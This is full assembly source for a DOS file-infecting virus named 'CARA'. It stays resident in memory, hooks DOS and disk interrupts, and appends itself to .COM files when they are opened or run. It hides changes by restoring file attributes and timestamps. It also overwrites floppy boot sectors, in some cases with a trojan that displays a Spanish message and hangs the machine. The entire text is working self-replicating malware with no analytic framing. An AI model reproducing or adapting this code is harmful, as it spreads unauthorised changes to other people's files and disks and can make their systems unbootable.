    cara segment
    assume cs:cara,ds:cara
    org 100h

    _0c01:  pushf
            push    ds
            push    es
            jmp     _0c03

    _0d02   db      0cdh,20h,'HEX-FILES'  ; this should be 11 bytes

    _0c03:  cli                           ; memory self-recognition
            xor     ax,ax
            mov     ds,ax
            mov     si,(61h*4)            ; check if int 61-64 is used
            mov     cx,8
    _0c04:  lodsw
            cmp     ax,0
            jnz     _0c06
            loop    _0c04
            push    cs
            pop     ds
            push    ds
            pop     es
            sub     word ptr ds:[2],0c0h  ; reset top of memory
            mov     ah,4ah
            mov     bx,0b000h
            int     21h
            sub     bx,0c0h               ; release memory required
            mov     ah,4ah
            int     21h
            mov     ah,48h                ; allocate memory
            mov     bx,80h
            int     21h
            mov     es,ax
    _0d05:  mov     si,offset _0c01       ; copy virii code to allocmem
            mov     di,offset _0c01
            mov     cx,offset _0d63-100h
            cld
            repe movsb
            push    es
            pop     ds
            mov     ds:[_0d23],1
            call    _0c08
            mov     ax,2162h              ; save int 21
            call    _0c10
            mov     ax,2063h              ; save int 20
            call    _0c10
            mov     ax,1361h              ; save int 13
            call    _0c10
            cli
            xor     ax,ax
            mov     ds,ax
            mov     word ptr ds:[(21h*4)],offset _0c31   ; hook int 21
            mov     word ptr ds:[((21h*4)+2)],es
            mov     word ptr ds:[(20h*4)],offset _0c11   ; hook int 20
            mov     word ptr ds:[((22h*4)+2)],es
            mov     word ptr ds:[(13h*4)],offset _0c14   ; hook int 13
            mov     word ptr ds:[((13h*4)+2)],es
            sti
    _0c06:  push    cs
            pop     es
            push    cs
            pop     ds
    _0d07:  mov     si,offset _0d02         ; restore victim file
            mov     di,100h
            mov     cx,11
            cld
            repe movsb
            pop     es
            pop     ds
            popf
            push    cs
            mov     ax,100h
            push    ax
            retf                            ; execute victim file

    _0c08:  int     12h                     ; get base memory
            and     ax,15                   ; check for boot virus
            jz      _0c09
            mov     ah,9                    ; show virus memory message
            mov     dx,offset _0d25
            int     21h
            mov     dx,offset _0d30
            int     21h
    _0c09:  ret

    _0c10:  push    cx                      ; save interrupt routine
            push    si
            push    di
            push    ds
            mov     di,ax
            mov     cl,2
            shl     di,cl
            and     di,3fch
            mov     cl,6
            shr     ax,cl
            and     ax,3fch
            mov     si,ax
            xor     ax,ax
            mov     ds,ax
            cli
            mov     ax,[si]
            mov     [di],ax
            mov     ax,[si+2]
            mov     [di+2],ax
            sti
            pop     ds
            pop     di
            pop     si
            pop     cx
            ret

    _0c11:  pop     ax                      ; retain psp as tsr
            pop     ax
            popf
            mov     es,ax
            push    cs
            pop     ds
            mov     si,offset _0c12
            mov     di,100h
            mov     cx,100h
            cld
            repe movsb
            mov     ds:[_0d23],0
            mov     ax,6320h
            call    _0c10
            push    es
            mov     ax,offset _0c01
            push    ax
            retf

    _0c12:  mov     dx,16
            int     27h

    _0d13   db      1,34h,12h,25h,12h,8ch,0c8h,8ch    ; vir-x boot sector
                                                      ; tri-vaccine

    _0c14:  push    es                      ; int 13 handler
            push    ds
            push    si
            push    di
            push    ax
            push    bx
            push    cx
            push    dx
            pushf
            sti
            cmp     dl,2
            ja      _0c16
            cmp     ah,2
            jz      _0c15
            jmp     _0c16
    _0c15:  push    cs
            pop     es
            push    es
            pop     ds
            cmp     byte ptr [_0d24],4
            jl      _0c21
            mov     ds:[_0d24],0
            mov     bx,offset _0d63
            xor     dh,dh
            mov     ax,201h
            call    _0c60
            jnb     _0c17
            jmp     _0c20
    _0c16:  jmp     _0c22

    _0c17:  mov     si,offset _0d13
            mov     di,offset _0d63 + 3
            mov     cx,8
            mov     ax,[di+0fdh]                 ;check for boot virus
            cmp     ax,1b1h                      ; pingpong
            jz      _0c18                        ;
            cmp     ax,6c0h                      ; microbe
            jz      _0c18                        ;
            cmp     ax,0cd00h                    ; stoned.standard
            jz      _0c18                        ;
            cmp     ax,2073h                     ; brain
            jz      _0c18                        ;
            cmp     ax,2020h                     ; ?
            jz      _0c18                        ;
            cmp     ax,0c982h                    ; ?
            jnz     _0c19                        ;
    _0c18:  mov     word ptr [_0d63],7debh     ; if virus is found overwrite
            mov     si,offset _0c26            ; boot sector with message
            mov     di,offset _0d63 + 7fh      ; popper (trojan)
            mov     cx,6ch                     ; otherwise, write boot
    _0c19:  cld                                ; sector (vir-x tri) vaccine
            repe movsb
            mov     ax,301h
            call    _0c60
    _0c20:  xor     ah,ah
            int     61h
    _0c21:  inc     byte ptr [_0d24]
    _0c22:  popf
            pop     dx
            pop     cx
            pop     bx
            pop     ax
            pop     di
            pop     si
            pop     ds
            pop     es
            int     61h
            retf    0002

    _0d23   db      ?
    _0d24   db      ?
    _0d25   db      'Virus es en memoria!$'
    ;
    ; message popper codes
    ;
    _0c26:  mov     si,7c93h        ; ((_0d29-_0c26)+7c7eh)
            mov     ah,0eh
            xor     bh,bh
            mov     cx, 58h         ; (_0c31-_0d29)
    _0c27:  mov     al,cs:[si]
            int     10h
            inc     si
            loop    _0c27
    _0c28:  jmp     _0c28

    _0d29   db      'Disco es infectado. Reemplaza "Boot".'

    _0d30   db      10,10,13,'Clandestino',13,10
            db      'Auto-',13,10
            db      'Reproductivo',13,10
            db      'Anti-virus',13,10,1,7,'$'

    _0c31:  jmp     _0c35

    _0d32   db      0e9h
    _0d33   dw      ?
            db      13
    _0d34   db      'CARA',1,7,1ah

    _0c35:  pushf                           ; int 21 handler
            cmp     ah,0                    ; is it terminate?
            jnz     _0c36
            popf
            push    cs
            mov     ax,offset _0c11         ; jump to retain psp
            push    ax
            retf

    _0c36:  cli
            push    si
            push    di
            push    es
            push    cx
            push    bx
            push    ax
            push    dx
            push    ds
            push    ax
            mov     ax,2464h               ; save and hook int 24
            call    _0c10
            xor     ax,ax
            mov     ds,ax
            mov     word ptr ds:[90h],offset _0c57
            mov     ds:[92h],cs
            pop     ax
            pop     ds
            push    ds
            cmp     ah,4ch                 ; is it terminate?
            jnz     _0c38
            push    ax
            push    ds
            push    cs
            pop     ds
            cmp     byte ptr [_0d23],0
            jnz     _0c37
            pop     ds
            pop     ax
            jmp     _0c38
    _0c37:  pop     ds
            pop     ax
            push    cs
            pop     ds
            mov     byte ptr [_0d23],0
            mov     ax,6320h
            call    _0c10                        ; restore int 20
            pop     ds
            pop     dx
            pop     ax                           ; retain psp
            mov     ah,31h
            mov     dx,16h
            push    ax
            push    dx
            push    ds
    _0c38:  cmp     ah,3dh                       ; open file
            jz      _0c39
            cmp     ah,43h                       ; file attribute
            jz      _0c39
            cmp     ah,4bh                       ; exec program
            jz      _0c39
            cmp     ah,56h                       ; rename file
            jnz     _0c44
    _0c39:  mov     bx,dx
            mov     cx,bx
            mov     ax,2eh                       ; get end of filespec
    _0c40:  cmp     al,[bx]
            jnz     _0c41
            mov     cx,bx
            jmp     _0c42
    _0c41:  cmp     ah,[bx]
            jz      _0c43
    _0c42:  inc     bx
            jmp     _0c40
    _0c43:  cmp     cx,dx                        ; check for com
            jz      _0c44
            mov     bx,cx
            mov     ax,'Cc'
            call    _0c58
            jnz     _0c47
            mov     ax,'Oo'
            call    _0c58
            jnz     _0c47
            mov     ax,'Mm'
            call    _0c58
            jz      _0c45
    _0c44:  jmp     _0c47
    _0c45:  pop     ds
            push    ds
            mov     cx,21h
            mov     ax,4300h
            int     62h
            push    cx
            and     cx,0feh                      ; clear read only attrib
            mov     ax,4301h
            int     62h
            mov     ax,3d02h                     ; open file red/write
            int     62h
            jb      _0c46
            mov     bx,ax                        ; save handle
            mov     cx,0
            mov     dx,1
            mov     ax,4202h                     ; get file length: eof+1
            int     62h
            cmp     ax,0
            jl      _0c48
            cmp     ax,1000h                     ; is it 4096 (4095+1)
            jl      _0c51                        ; exit if less
            jmp     _0c48
    _0c46:  pop     cx
    _0c47:  jmp     _0c49
    _0c48:  mov     cx,0
            mov     dx,0
            mov     ax,4200h                     ; pointer to start of file
            int     62h
            jb      _0c51
            push    cs
            pop     ds
            push    ds
            pop     es
            mov     cx,11
            mov     dx,offset _0d02
            mov     ah,3fh                       ; read 11 bytes
            int     62h
            jb      _0c51
            mov     si,offset _0d34
            mov     di,offset _0d02 + 4
            mov     cx,4
            cld
            repe cmpsb                        ; infect check look for "CARA"
            jz      _0c51
            jmp     _0c50
    _0c49:  jmp     _0c54
    _0c50:  push    cs
            pop     ds
            mov     cx,0
            mov     dx,1
            mov     ax,4202h                  ; move ptr to eof+1
            int     62h
            jnb     _0c52
    _0c51:  jmp     _0c53
    _0c52:  add     ax,offset _0c01           ; set up pointers for install
            mov     ds:[_0d05+1],ax
            sub     ax,103h
            mov     [_0d33],ax
            add     ax,109h
            mov     ds:[_0d07+1],ax
            mov     cx,offset _0d63-100h
            mov     dx,offset _0c01
            mov     ah,40h                    ; write virii to eof+1
            int     62h
            jb      _0c53
            mov     cx,0
            mov     dx,0
            mov     ax,4200h
            int     62h
            jb      _0c53
            mov     cx,11
            mov     dx,offset _0d32
            mov     ah,40h                    ; write virii sig & jumper
            int     62h
    _0c53:  pop     cx
            pop     ds
            pop     dx
            push    dx
            push    ds
            mov     ax,4301h                  ; reset file attribute
            int     62h
            mov     ax,5700h
            int     62h
            mov     ax,5701h                  ; preserve file time/date
            int     62h
            mov     ah,3eh                    ; close file
            int     62h
    _0c54:  mov     ax,6424h                 ; restore int 24
            call    _0c10
            pop     ds
            pop     dx
            pop     ax
            pop     bx
            pop     cx
            pop     es
            pop     di
            pop     si
            popf
            push    ds
            push    ax
            xor     ax,ax
            mov     ds,ax
            mov     ax,ds:[18ah]
            mov     cs:[_0d56],ax
            mov     ax,ds:[188h]
            mov     cs:[_0d55],ax
            pop     ax
            pop     ds
            db      0eah                    ; execute original int 21
    _0d55   dw      ?
    _0d56   dw      ?

    _0c57:  mov     al,3
            iret

    _0c58:  inc     bx
            cmp     ah,[bx]
            jz      _0c59
            cmp     al,[bx]
    _0c59:  ret

    _0c60:  mov     cx,4
    _0c61:  push    cx
            mov     cx,1
            int     61h
            pop     cx
            jnb     _0c62
            push    ax
            xor     ah,ah
            int     61h
            pop     ax
            loop    _0c61
    _0c62:  ret
    _0d63:

    cara ends

    end _0c01
